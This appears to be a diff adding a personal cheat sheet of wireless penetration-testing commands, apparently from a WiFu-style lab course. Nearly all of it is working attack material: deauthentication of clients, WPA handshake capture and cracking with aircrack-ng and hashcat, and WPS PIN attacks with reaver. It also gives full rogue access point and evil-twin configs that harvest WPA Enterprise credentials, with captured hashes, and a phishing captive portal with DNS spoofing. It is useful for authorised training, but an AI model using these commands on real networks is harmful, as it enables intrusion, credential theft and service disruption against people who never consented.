@@ -1,14 +1,639 @@
 #!/usr/bin/peno
 
-#airmon-ng
-#
+#Determining the Wireless Chipset
+sudo lsusb -vv
+--> Output: idVendor           0x148f Ralink Technology, Corp.
+    idProduct          0x5370 RT5370 Wireless Adapter
+
+#Getting a DHCP lease on wlan0
+sudo dhclient wlan0
+
+#Listing support modes on all wireless interfaces
+sudo iw list
+
+#Setting the IP address to wlan0
+sudo ip link set wlan0 up
+sudo ip addr add 10.0.0.1/24 dev wlan0
 
 
+#airmon-ng|iw
+###############
+#Checking for network managers using Airmon-ng
+sudo airmon-ng check
+
+#Killing network managers with Airmon-ng
+sudo airmon-ng check kill
+
+#Airmon-ng enabling monitor mode on wlan0
+sudo airmon-ng start wlan0
+
+#Using --verbose with Airmon-ng
+sudo airmon-ng --verbose
+
+#Using debug with airmon-ng
+sudo airmon-ng --debug
+
+#Airmon-ng enabling monitor mode on wlan0, channel 3
+sudo airmon-ng start wlan0 3
+
+#Checking current channel using iw
+sudo iw dev wlan0mon info
+
+#Using stop option with Airmon-ng
+sudo airmon-ng stop wlan0mon
 
 
+#airodump-ng
+###############
+#Airodump-ng options
+#-w prefix	Saves the capture dump to the specified filename
+#--bssid BSSID	Filters Airodump-ng to only capture the specified BSSID
+#-c channel(s)	Forces Airodump-ng to only capture the specified channel(s)
+
+#Airodump command on a fixed channel
+sudo airodump-ng wlan0mon -c 2
+
+#Airodump-ng focused on a channel and BSSID
+sudo airodump-ng -c 3 --bssid 34:08:04:09:3D:38 -w cap1 wlan0mon
+
+#executing airodump-ng with the -w option, followed by a filename prefix writes the output to a number of formats
+sudo airodump-ng --output-format csv,pcap wlan0mon
+
+#aireplay-ng
+###############
+#Aireplay-ng injection test
+sudo airmon-ng start wlan0 3
+sudo aireplay-ng -9 wlan0mon
+
+#Aireplay-ng injection test focused on an ESSID/BSSID
+sudo aireplay-ng -9 -e wifu -a 34:08:04:09:3D:38 wlan0mon
+
+#Aireplay-ng card-to-card injection test
+sudo aireplay-ng -9 -i wlan1mon wlan0mon
+
+#aircrack-ng
+###############
+#Benchmark on all CPUs
+aircrack-ng -S
+
+#airdecap-ng
+###############
+#Airdecap-ng removing wireless headers
+sudo airdecap-ng -b 34:08:04:09:3D:38 opennet-01.cap
+
+#airgraph-ng
+###############
+#Let's run Airgraph-ng with the -o option to output to a file name, the -i option to input an Airodump-ng .csv file, and -g to define a CAPR graph
+#To create this graph with our Airodump-ng .csv file, we'll use the -g CPG option
+airgraph-ng -o Picture1_png -i dump-01.csv -g CAPR
+airgraph-ng -o Picture2.png -i dump-01.csv -g CPG
+
+#all-together
+#############
+#Airodump-ng command and output on channel 3, focused on a BSSID
+#Deauthenticating client with aireplay
+#Cracking the The WPA shared key
+#Using airdecap-ng to decrypt the traffic
+sudo airodump-ng wlan0mon
+sudo airodump-ng -c 3 -w wpa --essid wifu --bssid 34:08:04:09:3D:38 wlan0mon
+sudo aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F wlan0mon
+aircrack-ng -w /usr/share/john/password.lst -e wifu -b 34:08:04:09:3D:38 wpa-01.cap
+airdecap-ng -b 34:08:04:09:3D:38 -e wifu -p 12345678 wpa-01.cap
+
+#Custom Wordlists with Aircrack-ng
+##################################
+#Listing all lines containing "password"
+grep -i password /usr/share/john/password.lst
+
+#Adding two mangling rules to JtR
+sudo nano /etc/john/john.conf
+--> Add two-three numbers to the end of each password 
+
+$[0-9]$[0-9]
+$[0-9]$[0-9]$[0-9]
+
+#Testing mangling rules with JtR
+john --wordlist=/usr/share/john/password.lst --rules --stdout | grep -i Password123
+
+#Using Crunch to generate wordlist with the charset abc123 with word between 8 and 9 characters
+crunch 8 9 abc123
+
+#Using Crunch to generate wordlist with starting with password and ending with three digits
+crunch 11 11 -t password%%%
+
+#Using Crunch to generate wordlist starting with 'password' and ending with three digits - Alternate version
+crunch 11 11 0123456789 -t password@@@
+
+#Using Crunch to generate wordlist using characters in 'abcde12345' without repeating any of them
+#The -p option generates unique words from a character set or a set of whole words. Although we still need to provide the minimum and maximum length, those numbers are ignored
+crunch 1 1 -p abcde12345
+
+#Using Crunch to generate wordlist with multiple words instead of characters, without repeating them
+crunch 1 1 -p dog cat bird
+
+#Using Crunch to generate wordlist with multiple words instead of characters, without repeating them and adding two digits
+crunch 5 5 -t ddd%% -p dog cat bird
+
+#Using Crunch to generate a non-repeating wordlist from multiple words and adding two characters from a defined character set
+crunch 5 5 aADE -t ddd@@ -p dog cat bird
+
+#Combining Crunch mangling and piping it to aircrack-ng
+crunch 11 11 -t password%%% | aircrack-ng -e wifu crunch-01.cap -w -
+
+#Using Aircrack-ng with RSMangler
+echo bird > wordlist.txt
+echo cat >> wordlist.txt
+echo dog >> wordlist.txt
+rsmangler --file wordlist.txt
+
+#RSMangler output to a file
+rsmangler --file wordlist.txt --output mangled.txt
+
+#Concatenated wordlist piped into RSMangler
+cat wordlist.txt | rsmangler --file -
+
+#Mangling wordlist using RSMangler and limiting to 12-13 characters
+rsmangler --file wordlist.txt --min 12 --max 13
+
+#Combining RSMangler mangling and piping it to Aircrack-ng
+rsmangler --file wordlist.txt --min 12 --max 13 | aircrack-ng -e wifu rsmangler-01.cap -w -
+
+#Displaying properties of a Skylake CPU using hashcat
+hashcat -I
+
+#Benchmarking the Skylake CPU using hashcat
+hashcat --help
+hashcat -b -m 2500
+
+#Installing hashcat utilities
+sudo apt install hashcat-utils
+
+#Converting PCAP to hccapx for hashcat
+#Note that aircrack-ng can also use .hccapx files as input for cracking.
+/usr/lib/hashcat-utils/cap2hccapx.bin wifu-01.cap output.hccapx
+
+#Cracking with hashcat
+hashcat -m 2500 output.hccapx /usr/share/john/password.lst
+
+#Airolib-ng
+###########
+#Adding the target ESSID to a file
+echo wifu > essid.txt
+
+#Importing the ESSID with airolib-ng
+airolib-ng wifu.sqlite --import essid essid.txt
+
+# Viewing the airolib-ng database statistics
+airolib-ng wifu.sqlite --stats
+
+#Importing passwords into the airolib-ng database
+airolib-ng wifu.sqlite --import passwd /usr/share/john/password.lst
+
+#Generating the PMKs for the ESSID
+airolib-ng wifu.sqlite --batch
+airolib-ng wifu.sqlite --stats
+
+#Recovering the WPA password with the airolib-ng database
+aircrack-ng -r wifu.sqlite wpa1-01.cap
+
+#coWPAtty
+
+#Creating pre-computed hash tables using genpmk
+#We run genpmk with -f to define our wordlist, -d to output to a file, and -s to specify the ESSID
+genpmk -f /usr/share/john/password.lst -d wifuhashes -s wifu
+
+#Using pre-computed hashtables with coWPAtty
+cowpatty -r wpajohn-01.cap -d wifuhashes -s wifu
+
+#Attacking WPS
+##############
+#Wash displaying WPS information for each AP
+wash -i wlan0mon
+
+#using reaver to attack our wifu AP. 
+#We have to specify the BSSID of the AP we gathered earlier using wash with -b, the wireless interface using -i, and a very verbose output with -vv.
+#Launching attack using reaver
+sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v
+
+# Using PixieWPS attack with reaver
+#One alternative to this method is to use bully with -d, which will attempt to run PixieWPS with the values we recovered from bully
+sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v -K
 
 
+#Checking the first three bytes of the BSSID against known PINs
+sudo apt install airgeddon
+source /usr/share/airgeddon/known_pins.db
+echo ${PINDB["0013F7"]}
 
+#Rogue Access Points
+####################
+
+#Discovery via airodump-ng
+sudo airodump-ng -w discovery --output-format pcap wlan0mon
+
+#Building the hostapd-mana Configuration
+#The simplest configuration for hostapd-mana
+kali@kali:~$ cat Mostar-mana.conf
+interface=wlan0
+ssid=Mostar
+channel=1
+
+#Adding hw_mode to the config file
+#Adding security configuration
+#Final Mostar-mana.conf
+kali@kali:~$ cat Mostar-mana.conf
+interface=wlan0
+ssid=Mostar
+channel=1
+hw_mode=g
+ieee80211n=1
+wpa=3
+wpa_key_mgmt=WPA-PSK
+wpa_passphrase=ANYPASSWORD
+wpa_pairwise=TKIP
+rsn_pairwise=TKIP CCMP
+mana_wpaout=/home/kali/mostar.hccapx
+
+#Running hostapd-mana
+sudo hostapd-mana Mostar-mana.conf
+
+#Deauthenticating clients
+sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan1mon
+
+#Capturing handshakes from deauthenticated clients
+kali@kali:~$ sudo hostapd-mana Mostar-mana.conf 
+Configuration file: Mostar-mana.conf
+MANA: Captured WPA/2 handshakes will be written to file 'mostar.hccapx'.
+Using interface wlan0 with hwaddr 2e:0b:05:98:f8:66 and ssid "Mostar"
+wlan0: interface state UNINITIALIZED->ENABLED
+wlan0: AP-ENABLED 
+...
+MANA: Captured a WPA/2 handshake from: fe:5c:f4:2b:d4:3e
+wlan0: AP-STA-POSSIBLE-PSK-MISMATCH fe:5c:f4:2b:d4:3e
+
+#Cracking the WPA/2 Hash
+aircrack-ng mostar.hccapx -e Mostar -w /usr/share/john/password.lst
+
+
+#Attacking WPA Enterprise
+#########################
+
+#Airodump-ng command and output
+sudo airodump-ng wlan0mon
+
+#Installing freeradius
+sudo apt install freeradius
+
+#certificate_authority section in ca.cnf
+kali@kali:~$ sudo -s
+root@kali:/home/kali# cd /etc/freeradius/3.0/certs
+root@kali:/etc/freeradius/3.0/certs# nano ca.cnf
+
+...
+[certificate_authority]
+countryName             = US
+stateOrProvinceName     = CA
+localityName            = San Francisco
+organizationName        = Playtronics
+emailAddress            = ca@playtronics.com
+commonName              = "Playtronics Certificate Authority"
+...
+
+#server section in server.cnf
+root@kali:/etc/freeradius/3.0/certs# nano server.cnf
+
+...
+[server]
+countryName             = US
+stateOrProvinceName     = CA
+localityName            = San Francisco
+organizationName        = Playtronics
+emailAddress            = admin@playtronics.com
+commonName              = "Playtronics"
+...
+
+#Certificate generation
+root@kali:/etc/freeradius/3.0/certs# rm dh
+root@kali:/etc/freeradius/3.0/certs# make
+
+#HostAPd configuration file, mana.conf
+#up to --> EOF
+# SSID of the AP
+ssid=Playtronics
+# Network interface to use and driver type
+# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
+interface=wlan0
+driver=nl80211
+# Channel and mode
+# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
+channel=1
+# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
+hw_mode=g
+# Setting up hostapd as an EAP server
+ieee8021x=1
+eap_server=1
+# Key workaround for Win XP
+eapol_key_index_workaround=0
+# EAP user file we created earlier
+eap_user_file=/etc/hostapd-mana/mana.eap_user
+# Certificate paths created earlier
+ca_cert=/etc/freeradius/3.0/certs/ca.pem
+server_cert=/etc/freeradius/3.0/certs/server.pem
+private_key=/etc/freeradius/3.0/certs/server.key
+# The password is actually 'whatever'
+private_key_passwd=whatever
+dh_file=/etc/freeradius/3.0/certs/dh
+# Open authentication
+auth_algs=1
+# WPA/WPA2
+wpa=3
+# WPA Enterprise
+wpa_key_mgmt=WPA-EAP
+# Allow CCMP and TKIP
+# Note: iOS warns when network has TKIP (or WEP)
+wpa_pairwise=CCMP TKIP
+# Enable Mana WPE
+mana_wpe=1
+# Store credentials in that file
+mana_credout=/tmp/hostapd.credout
+# Send EAP success, so the client thinks it's connected
+mana_eapsuccess=1
+# EAP TLS MitM
+mana_eaptls=1
+##EOF
+
+#HostAPd initiated
+sudo hostapd-mana /etc/hostapd-mana/mana.conf
+
+#HostAPd output with user 'cosmo' authenticating
+..
+wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
+MANA EAP Identity Phase 1: cosmo
+MANA EAP EAP-MSCHAPV2 ASLEAP user=cosmo | asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4
+MANA EAP EAP-MSCHAPV2 JTR | cosmo:$NETNTLM$ceb69885c656590c$7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:::::::
+MANA EAP EAP-MSCHAPV2 HASHCAT | cosmo::::7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:ceb69885c656590c
+..
+
+#Running asleap on hostAPd credentials
+kali@kali:~$ asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/john/password.lst
+asleap 2.2 - actively recover LEAP/PPTP passwords. <jwright@hasborg.com>
+Using wordlist mode with "/usr/share/john/password.lst".
+        hash bytes:        586c
+        NT hash:           8846f7eaee8fb117ad06bdd830b7586c
+        password:          password
+
+
+#Attacking Captive Portals
+##########################
+
+#Discovery via Airodump-ng
+sudo airodump-ng -w discovery --output-format pcap wlan0mon
+
+#Deauthenticating Clients
+sudo aireplay-ng -0 0 -a 00:0E:08:90:3A:5F wlan0mon
+
+#Building the Captive Portal
+#Installing Apache and PHP
+#Downloading MegaCorp One index page and its resources
+#Copy assets and old-site directories
+sudo apt install apache2 libapache2-mod-php
+wget -r -l2 https://www.megacorpone.com
+sudo cp -r ./www.megacorpone.com/assets/ /var/www/html/portal/
+sudo cp -r ./www.megacorpone.com/old-site/ /var/www/html/portal/
+
+#Changing the Captive Portal login check page
+#up to -->EOF
+<?php
+# Path of the handshake PCAP
+$handshake_path = '/home/kali/discovery-01.cap';
+..
+# Passphrase entered by the user
+$passphrase = $_POST['passphrase'];
+..
+# Add passphrase to wordlist ...
+$wordlist_path = tempnam('/tmp', 'wordlist');
+..
+# ... then crack the PCAP with it to see if it matches
+# If ESSID contains single quotes, they need escaping
+exec("aircrack-ng -e '". str_replace('\'', '\\\'', $essid) ."'" .
+" -w " . $wordlist_path . " " . $handshake_path, $output, $retval);
+..
+# Save the passphrase and redirect the user to the success page
+  @rename($wordlist_path, $success_path);
+#EOF
+
+#Networking Setup
+#wlan0 IP address configuration
+#Installing dnsmasq
+sudo ip addr add 192.168.87.1/24 dev wlan0
+sudo ip link set wlan0 up
+sudo apt install dnsmasq
+
+#We will use the following mco-dnsmasq.conf configuration file for DHCP
+#Up to -->EOF
+# Main options
+# http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html
+domain-needed
+bogus-priv
+no-resolv
+filterwin2k
+expand-hosts
+domain=localdomain
+local=/localdomain/
+# Only listen on this address. When specifying an
+# interface, it also listens on localhost.
+# We don't want to interrupt any local resolution
+# since the DNS responses will be spoofed
+listen-address=192.168.87.1
+# DHCP range
+dhcp-range=192.168.87.100,192.168.87.199,12h
+dhcp-lease-max=100
+# This should cover most queries
+# We can add 'log-queries' to log DNS queries
+address=/com/192.168.87.1
+address=/org/192.168.87.1
+address=/net/192.168.87.1
+
+# Entries for Windows 7 and 10 captive portal detection
+address=/dns.msftncsi.com/131.107.255.255
+#EOF
+
+#Starting dnsmasq
+sudo dnsmasq --conf-file=mco-dnsmasq.conf
+
+#Rogue AP hostapd configuration
+#Up to -->EOF
+interface=wlan0
+ssid=MegaCorp One Lab
+channel=11
+# 802.11n
+hw_mode=g
+ieee80211n=1
+# Uncomment the following lines to use OWE instead of an open network
+#wpa=2
+#ieee80211w=2
+#wpa_key_mgmt=OWE
+#rsn_pairwise=CCMP
+#EOF
+
+#Running hostapd
+sudo hostapd -B mco-hostapd.conf
+
+#Logs from hostapd and dnsmasq
+sudo tail -f /var/log/syslog | grep -E '(dnsmasq|hostapd)'
+
+
+#bettercap
+##########
+#There are a several commands in the bettercap Wi-Fi module that will be useful to us.
+#recon:1 Scan the 802.11 spectrum for APs and capture WPA/WPA2 handshakes.
+#deauth:2 Deauthenticate clients from an AP.
+#show:3 Display the discovered wireless stations.
+#ap:4 Create a rogue AP.
+
+#Installing bettercap
+sudo apt install bettercap
+
+#Starting bettercap while using wlan0
+sudo bettercap -iface wlan0
+
+#Starting the recon command
+wlan0  » wifi.recon on
+
+#Setting the channels to only 6 and 11
+wlan0  » wifi.recon.channel 6,11
+
+#Running the show Command
+wlan0  » wifi.show
+
+#Using ticker to display wireless stations
+wlan0  » set ticker.commands "clear; wifi.show"
+wlan0  » wifi.recon on
+..
+wlan0  » ticker on
+
+#Running commands at startup
+sudo bettercap -iface wlan0 -eval "set ticker.commands 'clear; wifi.show'; wifi.recon on; ticker on"
+
+#Listing clients on Corporate
+wlan0  » wifi.recon c6:2d:56:2a:53:f8
+wlan0  » wifi.show
+
+#Filtering clients connected to BSSID that start with the MAC Address "c0"
+wlan0  » set wifi.show.filter ^c0
+wlan0  » wifi.show
+
+#Listing clients on Corporate
+wlan0  » set wifi.show.filter ""
+wlan0  » set wifi.rssi.min -49
+wlan0  » wifi.show
+
+#Deauthenticating All Clients Connected to the "Corporate" AP
+wlan0  » wifi.deauth c6:2d:56:2a:53:f8
+
+#Deauthenticating a Single Client
+wlan0  » wifi.deauth ac:22:0b:28:fd:22
+
+#Changing the File and Aggregate settings
+ wlan1  » wifi.recon off
+ wlan1  » get wifi.handshakes.file 
+  wifi.handshakes.file: '~/bettercap-wifi-handshakes.pcap'
+ wlan0  » set wifi.handshakes.file "/home/kali/handshakes/"
+ wlan0  » set wifi.handshakes.aggregate false
+ wlan0  » wifi.recon on
+ wlan0  » wifi.deauth c6:2d:56:2a:53:f8
+ ...
+ -> Corporate (c6:2d:56:2a:53:f8) WPA2 handshake (full) to /home/kali/handshakes/Corporate_405d82dcb210.pcap
+
+#Unknown BSSID during deauth
+wlan0  » wifi.deauth AA:BB:CC:DD:EE:FF
+[15:22:08] [sys.log] [err] aa:bb:cc:dd:ee:ff is an unknown BSSID, is in the deauth skip list
+
+#Deauthentication filter
+wlan0  » set wifi.deauth.skip ac:22:0b:28:fd:22
+wlan0  » wifi.deauth c6:2d:56:2a:53:f8
+wlan0  » [15:38:34] [sys.log] [inf] wifi deauthing client c0:ee:fb:1a:d8:8d 
+
+#Caplet for mass deauthentication
+kali@kali:/usr/share/bettercap/caplets$ cat -n massdeauth.cap
+ 1  set $ {by}{fw}{env.iface.name}{reset} {bold}» {reset}
+...
+
+#Custom caplet for deauthentication
+kali@kali:~$ cat -n deauth_corp.cap 
+ 1  set $ {br}{fw}{net.received.human} - {env.iface.name}{reset} » {reset}
+ 2
+ 3  set ticker.period 10
+ 4  set ticker.commands clear; wifi.show; events.show; wifi.deauth c6:2d:56:2a:53:f8
+ 5
+ 6  events.ignore wifi.ap.new
+ 7  events.ignore wifi.client.probe
+ 8  events.ignore wifi.client.new
+ 9
+10  wifi.recon on
+11  ticker on
+12  events.clear
+13  clear
+
+#Running custom caplet
+sudo bettercap -iface wlan0 -caplet deauth_corp.cap
+
+
+#kismet
+#######
+
+#Installing Kismet
+sudo apt install kismet
+
+#Kismet configuration files
+ls -al /etc/kismet/
+
+#Kismet configuration information
+sudo kismet -c wlan0 --no-ncurses
+
+#Running Kismet on channels 4, 5, and 6
+sudo kismet -c wlan0:channels="4,5,6"
+
+#Staring Kismet as a daemon
+sudo kismet --daemonize
+
+#Remote Capture
+#Starting a Kismet server without a data source on kali
+#Establishing an SSH tunnel with port 8000 forwarded
+#Starting a remote capture
+
+sudo kismet
+ssh kali@192.168.62.192 -L 8000:localhost:3501
+sudo kismet_cap_linux_wifi --connect 127.0.0.1:8000 --source=wlan0
+
+#Log files
+#Opening a kismet file with sqlite
+sudo sqlite3 /var/log/kismet/Kismet-20200917-18-45-34-1.kismet
+
+#sqlite one-liner
+sudo sqlite3 /var/log/kismet/Kismet-20200917-18-45-34-1.kismet "select type, devmac from devices;"
+
+#Processing a PcapNg file with Kismet
+sudo kismet -c Documents/Network_Join_Nokia_Mobile.pcap:realtime=true
+
+#Checking datasources in a kismet file
+kismetdb_to_pcap --in Kismet-20200917-18-45-34-1.kismet --list-datasources
+
+#Converting a kismet file to a PcapNg file
+kismetdb_to_pcap --in Kismet-20200917-18-45-34-1.kismet --out sample.pcapng --verbose
+
+#Using kismetdb_dump_devices to create a .json file
+kismetdb_dump_devices --in /var/log/kismet/Kismet-20200917-17-45-17-1.kismet --out sample.json --skip-clean --verbose
+
+
+#Wireshark for wifi
+###################
+
+#displaying only beacon packets by using the filter wlan.fc.type_subtype == 0x08.
+wlan.fc.type_subtype == 0x08
+
+#targeting the Mostar SSID by adding && and using the filter wlan.ssid == "Mostar".
+wlan.fc.type_subtype == 0x08 && wlan.ssid == "Mostar"
 
 
 
